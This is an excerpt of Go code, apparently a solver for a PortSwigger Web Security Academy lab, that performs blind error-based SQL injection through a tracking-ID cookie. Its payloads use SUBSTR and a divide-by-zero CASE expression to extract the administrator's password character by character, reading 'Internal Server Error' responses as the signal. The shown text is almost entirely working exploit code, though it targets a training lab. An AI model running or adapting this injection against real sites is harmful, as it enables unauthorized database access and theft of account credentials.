...
func solve() error {
	...
	u := "https://0a5000dd0380e818c02d59ad00fa00c9.web-security-academy.net"
	loginUrl := u + "/login"
...
func compareChar(u string, trackingIdCookie *http.Cookie, cmpMode int, i int, c byte, client *http.Client) (bool, error) {
	...
	if cmpMode == 0 {
		trCookie.Value = trackingIdCookie.Value + "'||(SELECT CASE WHEN SUBSTR(password," + strconv.Itoa(i) + ",1)='" + string(c) + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
	} else if cmpMode < 0 {
		trCookie.Value = trackingIdCookie.Value + "'||(SELECT CASE WHEN SUBSTR(password," + strconv.Itoa(i) + ",1)<'" + string(c) + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
	} else {
		trCookie.Value = trackingIdCookie.Value + "'||(SELECT CASE WHEN SUBSTR(password," + strconv.Itoa(i) + ",1)>'" + string(c) + "' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
	...
	return strings.Contains(string(body), "Internal Server Error"), nil
